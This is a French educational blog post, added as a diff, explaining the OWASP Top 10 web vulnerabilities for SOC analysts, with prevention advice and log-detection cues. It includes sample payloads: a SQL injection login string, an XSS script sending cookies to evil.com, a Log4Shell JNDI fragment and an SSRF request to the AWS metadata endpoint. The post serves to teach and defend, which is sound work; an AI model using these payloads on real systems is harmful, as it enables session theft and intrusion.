@@ -1,0 +1,305 @@
+---
+title: "OWASP Top 10 : les 10 vulnérabilités web expliquées simplement"
+description: "Guide pratique des 10 vulnérabilités web les plus critiques, avec exemples concrets et comment les détecter en tant qu'analyste SOC."
+date: "2025-09-23"
+tags: ["OWASP", "Sécurité applicative", "DevSecOps", "SOC", "Web"]
+published: true
+---
+
+## C'est quoi l'OWASP Top 10 ?
+
+L'**OWASP Top 10** est la liste des 10 vulnérabilités web les plus critiques, publiée par l'Open Web Application Security Project. C'est **la référence incontournable** en sécurité applicative — tu la rencontres partout dans les rôles SOC et DevSecOps.
+
+**Pourquoi c'est important en SOC :**
+
+- La majorité des incidents de sécurité **commencent par une application web**
+- Comprendre ces failles te permet de **prioriser les alertes**
+- Les logs d'un WAF ou d'un serveur web reflètent souvent l'exploitation de ces vulnérabilités
+
+**Version actuelle : 2021** (10 catégories, contre 10 en 2017).
+
+## Vue d'ensemble
+
+| Code | Vulnérabilité | Criticité |
+|:---|:---|:---|
+| **A01** | Broken Access Control | 🔴 Critique |
+| **A02** | Cryptographic Failures | 🔴 Critique |
+| **A03** | Injection | 🔴 Critique |
+| **A04** | Insecure Design | 🟠 Élevée |
+| **A05** | Security Misconfiguration | 🟠 Élevée |
+| **A06** | Vulnerable & Outdated Components | 🟠 Élevée |
+| **A07** | Identification & Authentication Failures | 🟠 Élevée |
+| **A08** | Software & Data Integrity Failures | 🟡 Moyenne |
+| **A09** | Security Logging & Monitoring Failures | 🟡 Moyenne |
+| **A10** | SSRF | 🟡 Moyenne |
+
+---
+
+## A01 — Broken Access Control
+
+**La faille la plus répandue.** Un utilisateur peut accéder à des ressources qui ne lui appartiennent pas.
+
+**Exemple concret :**
+
+Tu es connecté sur ton compte. L'URL affiche `/profile?id=1234`. Tu changes en `/profile?id=1235` et tu vois le profil d'un autre utilisateur.
+
+**Autres cas :**
+- Accès à `/admin` sans être admin
+- Modification d'un objet via API sans vérification de propriété
+
+**En SOC :** logs suspects = requêtes répétées avec des IDs différents sur un endpoint sensible.
+
+**Comment s'en protéger :**
+- Vérifier les droits **côté serveur** (pas juste cacher le bouton côté client)
+- Utiliser des UUID au lieu d'IDs auto-incrémentés
+- Journaliser les accès refusés
+
+---
+
+## A02 — Cryptographic Failures
+
+Données sensibles stockées ou transmises **sans chiffrement correct**.
+
+**Exemples :**
+- HTTP au lieu de HTTPS
+- Mots de passe hashés en MD5 (cassable)
+- Clés API codées en dur dans le code source
+- Cookies de session sans flag `Secure` ni `HttpOnly`
+
+**En SOC :** détecter un site en HTTP qui traite des données personnelles = incident.
+
+**Comment s'en protéger :**
+- HTTPS partout (Let's Encrypt)
+- Hashage fort (bcrypt, argon2)
+- Secrets dans un vault (pas dans le code)
+- Chiffrement en base (AES-256)
+
+---
+
+## A03 — Injection
+
+Entrées utilisateur **non filtrées** injectées dans une requête SQL, une commande OS, ou du code JS (XSS).
+
+**Exemple classique — SQLi :**
+
+Champ login : `admin' OR 1=1 --`
+
+Si le code concatène directement :
+
+```sql
+SELECT * FROM users WHERE login='admin' OR 1=1 --' AND password='...'
+```
+
+→ Renvoie tous les utilisateurs. Accès admin sans mot de passe.
+
+**Exemple — XSS :**
+
+```html
+<script>fetch('https://evil.com/?c='+document.cookie)</script>
+```
+
+Envoyé dans un commentaire → tous les visiteurs envoient leur cookie à l'attaquant.
+
+**En SOC :** détecter `UNION SELECT`, `OR 1=1`, `<script>` dans les logs web.
+
+**Comment s'en protéger :**
+- **Requêtes préparées** (jamais de concaténation SQL)
+- Échapper les sorties HTML
+- Valider strictement les entrées (regex, whitelist)
+- WAF en complément (pas en remplacement)
+
+---
+
+## A04 — Insecure Design
+
+La sécurité n'a **pas été pensée dès la conception**. C'est structurel.
+
+**Exemple :**
+- Un système de réinitialisation de mot de passe qui envoie le nouveau mot de passe par email en clair
+- Une app de banque qui ne demande pas de confirmation pour les gros virements
+
+**En SOC :** ces failles sont difficilement détectables dans les logs — elles sont "by design".
+
+**Comment s'en protéger :**
+- **Threat modeling** dès la conception
+- Design patterns sécurisés
+- Revue d'architecture
+
+---
+
+## A05 — Security Misconfiguration
+
+Erreurs de configuration **humaines** :
+
+- Compte admin avec mot de passe par défaut (`admin/admin`)
+- Services inutiles exposés (ex: phpMyAdmin sur Internet)
+- CORS trop permissif (`Access-Control-Allow-Origin: *`)
+- Messages d'erreur verbeux (stack traces en prod)
+- Buckets S3 publics
+
+**En SOC :** scan interne qui découvre un `/phpmyadmin` accessible = alerte.
+
+**Comment s'en protéger :**
+- Hardening systématique
+- Désactiver tout ce qui n'est pas nécessaire
+- Scan régulier de configuration
+- Séparer les environnements (dev / prod)
+
+---
+
+## A06 — Vulnerable & Outdated Components
+
+Utilisation de bibliothèques avec des **CVE connues**.
+
+**Exemple célèbre : Log4Shell (CVE-2021-44228)**
+
+- Bibliothèque Java `log4j` < 2.15
+- Une simple chaîne `${jndi:ldap://...}` dans un log → exécution de code à distance
+- Touché : Minecraft, iCloud, Steam, des milliers d'apps
+
+**En SOC :** logs contenant `${jndi:` = tentative d'exploitation Log4Shell.
+
+**Comment s'en protéger :**
+- **SCA** (Software Composition Analysis) automatique
+- Mises à jour régulières
+- Surveiller les CVE (NVD, GitHub Advisory)
+- `npm audit`, `pip-audit`, `dependency-check`
+
+---
+
+## A07 — Identification & Authentication Failures
+
+Sessions mal gérées, absence de MFA, tokens JWT non vérifiés.
+
+**Exemples :**
+- Brute-force possible (pas de rate limiting)
+- Mot de passe faible accepté
+- Session qui ne se termine jamais
+- JWT sans vérification de signature
+
+**En SOC :** détecter 100 connexions échouées depuis une IP en 1 minute = brute-force.
+
+**Comment s'en protéger :**
+- **MFA** partout
+- Rate limiting sur les endpoints d'auth
+- Sessions avec expiration
+- Vérifier les JWT côté serveur
+- Politique de mot de passe robuste (NIST SP 800-63B)
+
+---
+
+## A08 — Software & Data Integrity Failures
+
+Pipelines CI/CD compromis, désérialisation non sécurisée, mises à jour sans vérification de signature.
+
+**Exemple célèbre : SolarWinds (2020)**
+
+- Un attaquant a compromis la chaîne de build
+- Injecté du code malveillant dans une mise à jour signée
+- Distribué à **18 000 clients** (dont des agences gouvernementales US)
+
+**En SOC :** très difficile à détecter — l'attaque vient de l'intérieur.
+
+**Comment s'en protéger :**
+- Signer les artefacts (GPG, Sigstore)
+- Vérifier les signatures avant déploiement
+- Sécuriser les pipelines CI/CD
+- Éviter la désérialisation de données non fiables
+
+---
+
+## A09 — Security Logging & Monitoring Failures
+
+**Pas de logs, logs insuffisants, ou alertes jamais surveillées.**
+
+**Conséquence :** les attaques passent **inaperçues pendant des mois**. En moyenne, **200+ jours** avant détection (rapport IBM).
+
+**Exemples :**
+- Aucun log d'authentification
+- Logs non centralisés
+- Alertes ignorées (fatigue d'alerte)
+
+**En SOC :** c'est **exactement** ce que ton travail vise à corriger. Sans logs, pas de détection.
+
+**Comment s'en protéger :**
+- **Centraliser** les logs (SIEM)
+- Logger les événements critiques (auth, admin, modification)
+- Définir des **règles d'alerte** pertinentes
+- Tester régulièrement les détections
+
+---
+
+## A10 — SSRF (Server-Side Request Forgery)
+
+L'attaquant force le **serveur** à faire des requêtes vers des ressources internes.
+
+**Exemple :**
+
+Une app accepte une URL en paramètre pour fetch une image :
+
+```
+https://app.com/fetch?url=https://externe.com/img.jpg
+```
+
+L'attaquant envoie :
+
+```
+https://app.com/fetch?url=http://169.254.169.254/latest/meta-data/
+```
+
+→ Le serveur interroge le **metadata endpoint AWS** et renvoie les credentials IAM.
+
+**Exemple célèbre : Capital One (2019)** — SSRF → accès à 100M de dossiers clients.
+
+**En SOC :** détecter des requêtes sortantes vers des IPs internes ou des metadata endpoints.
+
+**Comment s'en protéger :**
+- **Whitelist** stricte des domaines autorisés
+- Bloquer les IPs privées (RFC1918) et les metadata endpoints
+- Ne jamais faire confiance à une URL fournie par l'utilisateur
+
+---
+
+## Comment utiliser cette liste en pratique ?
+
+### En DevSecOps
+1. **Intégrer** ces catégories dans les revues de code
+2. **Automatiser** les scans (SAST, DAST, SCA)
+3. **Former** les développeurs
+
+### En SOC
+1. **Mapper** les alertes à ces catégories (ex: brute-force = A07)
+2. **Prioriser** selon la criticité
+3. **Surveiller** les logs web (injections, scans)
+4. **Corréler** avec les CVE (A06)
+
+### En reconversion
+1. **Connaître** ces 10 catégories par cœur
+2. **Savoir** les reconnaître dans un log
+3. **Comprendre** les contre-mesures
+
+---
+
+## Récapitulatif rapide
+
+| Code | Vulnérabilité | Mot-clé |
+|:---|:---|:---|
+| A01 | Broken Access Control | Accès non autorisé |
+| A02 | Cryptographic Failures | Chiffrement faible |
+| A03 | Injection | SQL, XSS, OS |
+| A04 | Insecure Design | Conception |
+| A05 | Security Misconfiguration | Config |
+| A06 | Outdated Components | CVE, dépendances |
+| A07 | Auth Failures | Sessions, brute-force |
+| A08 | Integrity Failures | CI/CD, supply chain |
+| A09 | Logging Failures | Pas de logs |
+| A10 | SSRF | Requêtes côté serveur |
+
+---
+
+## Pour aller plus loin
+
+- [OWASP Top 10 officiel](https://owasp.org/Top10/)
+- [Network Packet Analyzer — mini-IDS Python](/projects/network-analyzer)
+- [Analyser un scan Nmap avec Wireshark](/blog/analyser-scan-nmap-wireshark)
+- [Nmap : le guide complet des options](/blog/nmap-guide-complet-options)
